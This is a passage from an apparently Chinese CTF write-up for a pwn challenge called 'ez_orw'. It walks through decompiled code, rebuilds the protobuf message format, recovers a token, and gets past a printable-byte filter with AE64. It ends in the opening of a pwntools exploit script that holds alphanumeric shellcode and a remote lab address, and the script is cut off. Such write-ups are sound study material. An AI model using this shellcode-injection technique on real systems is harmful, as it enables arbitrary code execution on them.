class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD v3[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_16FE(a1, a2, a3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;DO U love xiao/a/giao?&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%llx&quot;</span>, v3);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)v3[<span class="number">0</span>] == <span class="string">&quot;yes&quot;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;ll give you a replacement egg&quot;</span>);</span><br><span class="line">      sub_1D96();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I won&#x27;t even give you eggs to replenish&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;dword_5008);</span><br><span class="line">    <span class="keyword">if</span> ( dword_5008 &lt;= <span class="number">255</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>, &amp;dword_5008);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先要输入一个地址，这个地址的值上的值是yes，之后就会进入一个真正的主function</p><p>然后输入一个<code>&amp;dd_5008</code>只要满足<code>&lt;=255</code>，就会泄露一个地址，然后就能完成上面的条件了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1D96</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  _BYTE buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your giao: &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  qword_5058 = sub_218D(<span class="number">0LL</span>, v1, buf);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_5058 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your giao is error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_19A1(*(_QWORD *)(qword_5058 + <span class="number">64</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(qword_5058 + <span class="number">24</span>) == <span class="number">1131796LL</span> &amp;&amp; *(_QWORD *)(qword_5058 + <span class="number">32</span>) == <span class="number">4281361LL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_1908(*(_QWORD *)(qword_5058 + <span class="number">48</span>), (<span class="type">unsigned</span> <span class="type">int</span>)*(_QWORD *)(qword_5058 + <span class="number">40</span>));</span><br><span class="line">      sub_17CC();</span><br><span class="line">      <span class="keyword">if</span> ( *(_QWORD *)(qword_5058 + <span class="number">40</span>) &lt; (<span class="type">unsigned</span> __int64)dword_5008 &amp;&amp; v1 &lt;= <span class="number">0xFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(dest, *(<span class="type">const</span> <span class="type">void</span> **)(qword_5058 + <span class="number">48</span>), *(_QWORD *)(qword_5058 + <span class="number">40</span>));</span><br><span class="line">        ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过简单分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000004B20 ; ===========================================================================</span><br><span class="line">.data.rel.ro:0000000000004B20</span><br><span class="line">.data.rel.ro:0000000000004B20 ; Segment type: Pure data</span><br><span class="line">.data.rel.ro:0000000000004B20 ; Segment permissions: Read/Write</span><br><span class="line">.data.rel.ro:0000000000004B20 _data_rel_ro    segment align_32 public &#x27;DATA&#x27; use64</span><br><span class="line">.data.rel.ro:0000000000004B20                 assume cs:_data_rel_ro</span><br><span class="line">.data.rel.ro:0000000000004B20                 ;org 4B20h</span><br><span class="line">.data.rel.ro:0000000000004B20 stru_4B20       ProtobufCFieldDescriptor &lt;offset aGiaoid, 1, 3, 3, 0, 18h, 0, 0, 0, 0,\</span><br><span class="line">.data.rel.ro:0000000000004B20                                         ; DATA XREF: .data.rel.ro:stru_4C40↓o ; &quot;giaoid&quot;</span><br><span class="line">.data.rel.ro:0000000000004B20                                           0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000004B68                 ProtobufCFieldDescriptor &lt;offset aGiaosize, 2, 3, 3, 0, 20h, 0, 0, 0, \ ; &quot;giaosize&quot;</span><br><span class="line">.data.rel.ro:0000000000004B68                                           0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000004BB0                 ProtobufCFieldDescriptor &lt;offset aGiaocontent, 3, 3, 0Fh, 0, 28h, 0, \ ; &quot;giaocontent&quot;</span><br><span class="line">.data.rel.ro:0000000000004BB0                                           0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000004BF8                 ProtobufCFieldDescriptor &lt;offset aGiaotoken, 4, 3, 0Fh, 0, 38h, 0, 0, \ ; &quot;giaotoken&quot;</span><br><span class="line">.data.rel.ro:0000000000004BF8                                           0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000004C40 stru_4C40       ProtobufCMessageDescriptor &lt;28AAEEF9h, offset aGiaoMsgiao, \</span><br><span class="line">.data.rel.ro:0000000000004C40                                         ; DATA XREF: sub_2004+5B↑o</span><br><span class="line">.data.rel.ro:0000000000004C40                                         ; sub_206C+17↑o ...</span><br><span class="line">.data.rel.ro:0000000000004C40                                             offset aMsgiao, offset aGiaoMsgiao_0, \ ; &quot;giao.msgiao&quot;</span><br><span class="line">.data.rel.ro:0000000000004C40                                             offset aGiao, 48h, 4, offset stru_4B20, \ ; &quot;Msgiao&quot;</span><br><span class="line">.data.rel.ro:0000000000004C40                                             offset unk_3110, 1, offset unk_3120, \</span><br><span class="line">.data.rel.ro:0000000000004C40                                             2004h, 0, 0, 0&gt;</span><br></pre></td></tr></table></figure><p>定义.proto</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">devicemsg</span>&#123;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">int64</span> giaoid = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">int64</span> giaosize = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">bytes</span> giaocontent = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">bytes</span> giaotoken = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过上述ida结构体的定义可以得到以下的内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1D96</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  _BYTE buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your giao: &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  giao_message = (_Devicemsg *)unpack(<span class="number">0LL</span>, v1, (__int64)buf);</span><br><span class="line">  <span class="keyword">if</span> ( !giao_message )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your giao is error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_19A1((<span class="type">const</span> <span class="type">char</span> *)giao_message-&gt;giaotoken.data)</span><br><span class="line">    &amp;&amp; giao_message-&gt;giaoid == <span class="number">1131796</span></span><br><span class="line">    &amp;&amp; giao_message-&gt;giaosize == <span class="number">4281361</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_1908(giao_message-&gt;giaocontent.data, (<span class="type">unsigned</span> <span class="type">int</span>)giao_message-&gt;giaocontent.len);</span><br><span class="line">    sub_17CC();</span><br><span class="line">    <span class="keyword">if</span> ( giao_message-&gt;giaocontent.len &lt; dword_5008 &amp;&amp; v1 &lt;= <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, giao_message-&gt;giaocontent.data, giao_message-&gt;giaocontent.len);</span><br><span class="line">      ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出是一个orw的shellcode的写入，shellcode的内容就是content的内容，其中长度要小于之前写入<code>dd_5008</code>的值且小于0x100，但是token和giaoid，giaosize都要满足相对应的值，才能进入相应的分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_19A1</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-258h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-254h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-250h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-248h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+30h] [rbp-240h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-238h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+40h] [rbp-230h]</span></span><br><span class="line">  _QWORD v10[<span class="number">32</span>]; <span class="comment">// [rsp+50h] [rbp-220h] BYREF</span></span><br><span class="line">  _WORD v11[<span class="number">12</span>]; <span class="comment">// [rsp+150h] [rbp-120h] BYREF</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+168h] [rbp-108h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+170h] [rbp-100h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+178h] [rbp-F8h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+180h] [rbp-F0h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+188h] [rbp-E8h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+190h] [rbp-E0h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+198h] [rbp-D8h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+1A0h] [rbp-D0h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+1A8h] [rbp-C8h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+1B0h] [rbp-C0h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+1B8h] [rbp-B8h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+1C0h] [rbp-B0h]</span></span><br><span class="line">  __int64 v24; <span class="comment">// [rsp+1C8h] [rbp-A8h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+1D0h] [rbp-A0h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+1D8h] [rbp-98h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+1E0h] [rbp-90h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+1E8h] [rbp-88h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+1F0h] [rbp-80h]</span></span><br><span class="line">  __int64 v30; <span class="comment">// [rsp+1F8h] [rbp-78h]</span></span><br><span class="line">  __int64 v31; <span class="comment">// [rsp+200h] [rbp-70h]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+208h] [rbp-68h]</span></span><br><span class="line">  __int64 v33; <span class="comment">// [rsp+210h] [rbp-60h]</span></span><br><span class="line">  __int64 v34; <span class="comment">// [rsp+218h] [rbp-58h]</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+220h] [rbp-50h]</span></span><br><span class="line">  __int64 v36; <span class="comment">// [rsp+228h] [rbp-48h]</span></span><br><span class="line">  __int64 v37; <span class="comment">// [rsp+230h] [rbp-40h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+238h] [rbp-38h]</span></span><br><span class="line">  __int64 v39; <span class="comment">// [rsp+240h] [rbp-30h]</span></span><br><span class="line">  __int64 v40; <span class="comment">// [rsp+248h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v41; <span class="comment">// [rsp+258h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v41 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)v11, <span class="string">&quot;114514giaogiaogiao99&quot;</span>);</span><br><span class="line">  HIBYTE(v11[<span class="number">10</span>]) = <span class="number">0</span>;</span><br><span class="line">  v11[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">0LL</span>;</span><br><span class="line">  v16 = <span class="number">0LL</span>;</span><br><span class="line">  v17 = <span class="number">0LL</span>;</span><br><span class="line">  v18 = <span class="number">0LL</span>;</span><br><span class="line">  v19 = <span class="number">0LL</span>;</span><br><span class="line">  v20 = <span class="number">0LL</span>;</span><br><span class="line">  v21 = <span class="number">0LL</span>;</span><br><span class="line">  v22 = <span class="number">0LL</span>;</span><br><span class="line">  v23 = <span class="number">0LL</span>;</span><br><span class="line">  v24 = <span class="number">0LL</span>;</span><br><span class="line">  v25 = <span class="number">0LL</span>;</span><br><span class="line">  v26 = <span class="number">0LL</span>;</span><br><span class="line">  v27 = <span class="number">0LL</span>;</span><br><span class="line">  v28 = <span class="number">0LL</span>;</span><br><span class="line">  v29 = <span class="number">0LL</span>;</span><br><span class="line">  v30 = <span class="number">0LL</span>;</span><br><span class="line">  v31 = <span class="number">0LL</span>;</span><br><span class="line">  v32 = <span class="number">0LL</span>;</span><br><span class="line">  v33 = <span class="number">0LL</span>;</span><br><span class="line">  v34 = <span class="number">0LL</span>;</span><br><span class="line">  v35 = <span class="number">0LL</span>;</span><br><span class="line">  v36 = <span class="number">0LL</span>;</span><br><span class="line">  v37 = <span class="number">0LL</span>;</span><br><span class="line">  v38 = <span class="number">0LL</span>;</span><br><span class="line">  v39 = <span class="number">0LL</span>;</span><br><span class="line">  v40 = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)s = <span class="number">0xB95FA87BA6AF366A</span>LL;</span><br><span class="line">  v6 = <span class="number">0x918D1C0CC7837D63</span>LL;</span><br><span class="line">  v7 = <span class="number">0xF877F9B36B6EF2D3</span>LL;</span><br><span class="line">  v8 = <span class="number">0x8EFDECFCE888E2BF</span>LL;</span><br><span class="line">  v9 = <span class="number">1090425597</span>;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)v11);</span><br><span class="line">  sub_1417(v10, v11, v1);</span><br><span class="line">  sub_15EC(v10, a1, v4, v11);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(a1, s) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一看就是一个复杂的加解密过程，不过我简单分析得出giaotoken在这个解密中，不会因为giaotoken的改变而发生key的改变，且解密只是一个简单的异或操作，因此可以把<code>114514giaogiaogiao99</code>输入进去就能获得giaotoken</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505132037156.png" alt="image-20250513201404551" style="zoom:50%;" /><p>进入了最终分支之后，发现对shellcode的字节有做要求</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1908</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a2 - <span class="number">1</span> + a1) == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 - <span class="number">1</span> + a1) = <span class="number">0</span>;</span><br><span class="line">    v3 = a2 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">char</span> *)((<span class="type">int</span>)i + a1) &lt;= <span class="string">&#x27;\x1F&#x27;</span> || *(_BYTE *)((<span class="type">int</span>)i + a1) == <span class="string">&#x27;\x7F&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Oops!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不能是小于<code>\x1F</code>和<code>\x7F</code>，那么AE64一把梭即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> giao_pb2</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./ez_orw&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line">ae64 = AE64()</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n     :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line">fmt =<span class="keyword">lambda</span> string:<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line">r64 =<span class="keyword">lambda</span>                         :u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#fmt(&#x27;%&#123;one_gadget &amp; 0xffff&#125;c&#x27;)</span></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;100.100.1.16&#x27;</span>,<span class="number">6498</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span 